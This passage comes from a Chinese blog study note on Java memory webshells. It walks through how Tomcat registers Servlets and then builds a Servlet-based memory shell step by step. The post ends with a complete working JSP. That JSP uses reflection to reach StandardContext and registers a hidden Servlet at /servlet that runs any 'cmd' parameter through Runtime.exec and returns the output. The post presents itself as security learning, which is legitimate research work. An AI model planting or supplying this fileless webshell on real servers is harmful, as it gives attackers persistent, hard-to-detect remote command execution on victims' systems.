<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">public</span> class ContextConfig implements LifecycleListener &#123;<br>    <span class="hljs-params">...</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-literal">void</span> configureContext(WebXml webxml) &#123;<br>    <span class="hljs-params">...</span><br>        for (ServletDef servlet : webxml.getServlets().values()) &#123;<br>        	<span class="hljs-comment">// 对每个Servlet创建wrapper</span><br>            Wrapper wrapper = context.createWrapper();<br>            <span class="hljs-comment">// Description is ignored</span><br>            <span class="hljs-comment">// Display name is ignored</span><br>            <span class="hljs-comment">// Icons are ignored</span><br>            <span class="hljs-comment">// 设置LoadOnStartup属性</span><br>            <span class="hljs-keyword">if</span> (servlet.getLoadOnStartup() != <span class="hljs-built_in">null</span>) &#123;<br>                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());<br>            &#125;<br>			<span class="hljs-params">...</span> <br>			<span class="hljs-comment">// 设置ServletName属性</span><br>            wrapper.setName(servlet.getServletName());<br>            <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>,<span class="hljs-built_in">String</span>&gt; <span class="hljs-keyword">params</span> = servlet.getParameterMap();<br>            for (Entry&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">String</span>&gt; entry : <span class="hljs-keyword">params</span>.entrySet()) &#123;<br>                wrapper.addInitParameter(entry.getKey(), entry.getValue());<br>            &#125;<br>            wrapper.setRunAs(servlet.getRunAs());<br>            <span class="hljs-built_in">Set</span>&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();<br>            for (SecurityRoleRef roleRef : roleRefs) &#123;<br>                wrapper.addSecurityReference(<br>                        roleRef.getName(), roleRef.getLink());<br>            &#125;<br>            <span class="hljs-comment">// 设置ServletClass属性</span><br>            wrapper.setServletClass(servlet.getServletClass());<br>            <span class="hljs-params">...</span><br>            wrapper.setOverridable(servlet.isOverridable());<br>            <span class="hljs-comment">// 将包装好的StandWrapper添加进ContainerBase的children属性中</span><br>            context.addChild(wrapper);<br>            for (Entry&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">String</span>&gt; entry :<br>                webxml.getServletMappings().entrySet()) &#123;<br>          <br>            <span class="hljs-comment">//添加路径映射</span><br>            context.addServletMappingDecoded(entry.getKey(), entry.getValue());<br>        &#125;<br>        &#125;<br>	&#125;<br></code></pre></td></tr></table></figure>

<p>最后通过<code>addServletMappingDecoded()</code>方法添加Servlet对应的url映射。</p>
<h4 id="构造Servlet内存马"><a href="#构造Servlet内存马" class="headerlink" title="构造Servlet内存马"></a>构造Servlet内存马</h4><p>通过对动态注册Servlet流程进行分析我们可以得到动态注册步骤步骤：</p>
<ul>
<li>1.编写恶意<code>Servlet</code>类</li>
<li>2.获得<code>StandardContext</code>对象</li>
<li>3.通过<code>StandardContext.createWrapper()</code>创建<code>StandardWrapper</code>对象。</li>
<li>4.设置<code>StandardWrapper</code>对象的<code>loadOnStartup</code>属性值。</li>
<li>5.设置<code>StandardWrapper</code>对象的<code>ServletName</code>属性值。</li>
<li>6.设置<code>StandardWrapper</code>对象的<code>ServletClass</code>属性值。</li>
<li>7.将<code>StandardWrapper</code>对象添加进<code>StandardContext</code>对象的<code>children</code>属性中。</li>
<li>8.通过<code>StandardContext.addServletMappingDecoded()</code>添加对应的路径映射。</li>
</ul>
<h5 id="编写恶意Servlet类"><a href="#编写恶意Servlet类" class="headerlink" title="编写恶意Servlet类"></a>编写恶意<code>Servlet</code>类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Servlet_memshell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>        <span class="hljs-keyword">private</span> String message;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>            message = <span class="hljs-string">&quot;Servlet 命令执行输出：\n&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span>(cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br>                    <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bins</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(ins);<br>                    resp.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>                    resp.getWriter().write(message);<br>                    <span class="hljs-type">int</span> len;<br>                    <span class="hljs-keyword">while</span> ((len = bins.read()) != -<span class="hljs-number">1</span>) &#123;<br>                        resp.getWriter().write(len);<br>                    &#125;<br>                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                    resp.getWriter().println(e.getMessage());<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>            <span class="hljs-built_in">super</span>.doPost(req, resp);<br>        &#125;<br>    &#125;<br><br>%&gt;<br></code></pre></td></tr></table></figure>

<h5 id="获得StandardContext对象-2"><a href="#获得StandardContext对象-2" class="headerlink" title="获得StandardContext对象"></a>获得StandardContext对象</h5><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// 获得StandardContext<br>Field reqF<span class="hljs-operator">=</span>request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>)<span class="hljs-comment">;</span><br>reqF.setAccessible(true)<span class="hljs-comment">;</span><br>Request req <span class="hljs-operator">=</span> (Request) reqF.get(request)<span class="hljs-comment">;</span><br>StandardContext standardCcontext <span class="hljs-operator">=</span> (StandardContext) req.getContext()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<h5 id="创建Wrapper"><a href="#创建Wrapper" class="headerlink" title="创建Wrapper"></a>创建Wrapper</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">// 创建<span class="hljs-keyword">Wrapper</span><br>Servlet_memshell servlet_memshell = <span class="hljs-built_in">new</span> Servlet_memshell();<br><span class="hljs-keyword">Wrapper</span> <span class="hljs-keyword">wrapper</span> = standardCcontext.createWrapper();<br></code></pre></td></tr></table></figure>

<h5 id="设置Servlet属性"><a href="#设置Servlet属性" class="headerlink" title="设置Servlet属性"></a>设置Servlet属性</h5><p><strong>设置loadOnStartup属性</strong></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">wrapper</span>.setLoadOnStartup(<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure>

<p><strong>设置ServletName属性</strong></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">wrapper</span>.setName(<span class="hljs-type">name</span>);<br></code></pre></td></tr></table></figure>

<p><strong>设置ServletClass属性</strong></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">wrapper</span>.setServlet(servlet_memshell);<br></code></pre></td></tr></table></figure>

<h5 id="动态注册Servlet"><a href="#动态注册Servlet" class="headerlink" title="动态注册Servlet"></a>动态注册Servlet</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">// 将<span class="hljs-keyword">Wrapper</span>添加到StandardContext<br>standardCcontext.addChild(<span class="hljs-keyword">wrapper</span>);<br>standardCcontext.addServletMappingDecoded(&quot;/servlet&quot;,<span class="hljs-type">name</span>);<br></code></pre></td></tr></table></figure>

<h4 id="Servlet内存马完整代码"><a href="#Servlet内存马完整代码" class="headerlink" title="Servlet内存马完整代码"></a>Servlet内存马完整代码</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;%@ page <span class="hljs-keyword">import</span>=&quot;java.lang.reflect.Field&quot; %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=&quot;org.apache.catalina.connector.Request&quot; %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=&quot;java.io.IOException&quot; %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=&quot;org.apache.catalina.Wrapper&quot; %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=&quot;java.io.InputStream&quot; %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=&quot;java.io.BufferedInputStream&quot; %&gt;<br>&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; <span class="hljs-keyword">language</span>=&quot;java&quot;%&gt;<br>&lt;%!<br>    <span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> Servlet_memshell extends HttpServlet &#123;<br>        private String message;<br><br>        <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> init() &#123;<br>            message = &quot;Servlet 命令执行输出：\n&quot;;<br>        &#125;<br><br>        <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;<br>            String cmd = req.getParameter(&quot;cmd&quot;);<br>            <span class="hljs-keyword">if</span>(cmd != <span class="hljs-keyword">null</span>) &#123;<br>                try &#123;<br>                    InputStream ins = Runtime.getRuntime().exec(cmd).getInputStream();<br>                    BufferedInputStream bins = <span class="hljs-built_in">new</span> BufferedInputStream(ins);<br>                    resp.setContentType(&quot;text/html;charset=UTF-8&quot;);<br>                    resp.getWriter().<span class="hljs-keyword">write</span>(message);<br>                    <span class="hljs-type">int</span> len;<br>                    <span class="hljs-keyword">while</span> ((len = bins.<span class="hljs-keyword">read</span>()) != <span class="hljs-number">-1</span>) &#123;<br>                        resp.getWriter().<span class="hljs-keyword">write</span>(len);<br>                    &#125;<br>                &#125;catch (<span class="hljs-keyword">Exception</span> e)&#123;<br>                    resp.getWriter().println(e.getMessage());<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;<br>            super.doPost(req, resp);<br>        &#125;<br>    &#125;<br><br>%&gt;<br>&lt;%<br>    // 获得StandardContext<br>    Field reqF=request.getClass().getDeclaredField(&quot;request&quot;);<br>    reqF.setAccessible(<span class="hljs-keyword">true</span>);<br>    Request req = (Request) reqF.<span class="hljs-keyword">get</span>(request);<br>    StandardContext standardCcontext = (StandardContext) req.getContext();<br><br>    // 创建<span class="hljs-keyword">Wrapper</span><br>    Servlet_memshell servlet_memshell = <span class="hljs-built_in">new</span> Servlet_memshell();<br>    <span class="hljs-keyword">Wrapper</span> <span class="hljs-keyword">wrapper</span> = standardCcontext.createWrapper();<br>    String <span class="hljs-type">name</span> = servlet_memshell.getClass().getSimpleName();<br>    <span class="hljs-keyword">wrapper</span>.setName(<span class="hljs-type">name</span>);<br>    <span class="hljs-keyword">wrapper</span>.setLoadOnStartup(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">wrapper</span>.setServlet(servlet_memshell);<br>    <span class="hljs-keyword">wrapper</span>.setServletClass(servlet_memshell.getClass().getName());<br><br>    // 将<span class="hljs-keyword">Wrapper</span>添加到StandardContext<br>    standardCcontext.addChild(<span class="hljs-keyword">wrapper</span>);<br>    standardCcontext.addServletMappingDecoded(&quot;/servlet&quot;,<span class="hljs-type">name</span>);<br>%&gt;<br></code></pre></td></tr></table></figure>













<h3 id="参考链接-3"><a href="#参考链接-3" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/PpACf/article/details/124685242?spm=1001.2014.3001.5502">Request和Response的概述及其方法_pan-jin的博客-CSDN博客_response实现了什么接口</a></p>
<p><a target="_blank" rel="noopener" href="http://miku233.viewofthai.link/2022/05/29/servlet%E5%86%85%E5%AD%98%E9%A9%AC/">servlet内存马</a></p>
<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1355">Java安全学习——内存马</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">学习笔记</a>
  
  

      </span>
    
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" class="print-no-link">#内存马</a>
      
        <a href="/tags/Java/" class="print-no-link">#Java</a>
      
        <a href="/tags/php/" class="print-no-link">#php</a>
      
        <a href="/tags/Python/" class="print-no-link">#Python</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>内存马学习</div>
      <div>https://genioco.github.io/2022/05/06/Learn/内存马学习/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>BadWolf</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2022年5月6日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/07/12/Learn/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="Go语言学习">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Go语言学习</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/01/08/Tools/Kali%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/" title="kali工具用法介绍（更新中）">
                        <span class="hidden-mobile">kali工具用法介绍（更新中）</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
    <div id="giscus" class="giscus"></div>
    <script type="text/javascript">
      Fluid.utils.loadComments('#giscus', function() {
        var options = {"repo":"genIoco/genIoco.github.io","repo-id":"R_kgDOMU-44w","category":"General","category-id":"DIC_kwDOMU-4484CgxC5","theme-light":"light","theme-dark":"dark","mapping":"og:title","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN"};
        var attributes = {};
        for (let option in options) {
          if (!option.startsWith('theme-')) {
            var key = option.startsWith('data-') ? option : 'data-' + option;
            attributes[key] = options[option];
          }
        }
        var light = 'light';
        var dark = 'dark';
        window.GiscusThemeLight = light;
        window.GiscusThemeDark = dark;
        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
        for (let attribute in attributes) {
          var value = attributes[attribute];
          if (value === undefined || value === null || value === '') {
            delete attributes[attribute];
          }
        }
        var s = document.createElement('script');
        s.setAttribute('src', 'https://giscus.app/client.js');
        s.setAttribute('crossorigin', 'anonymous');
        for (let attribute in attributes) {
          s.setAttribute(attribute, attributes[attribute]);
        }
        var ss = document.getElementsByTagName('script');
        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
        e.parentNode.insertBefore(s, e.nextSibling);
      });
    </script>
    <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  
<script src="/js/DynamicRibbon.js"></script>
<script src="/js/leaves.js"></script>
<script src="/js/containsWord.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
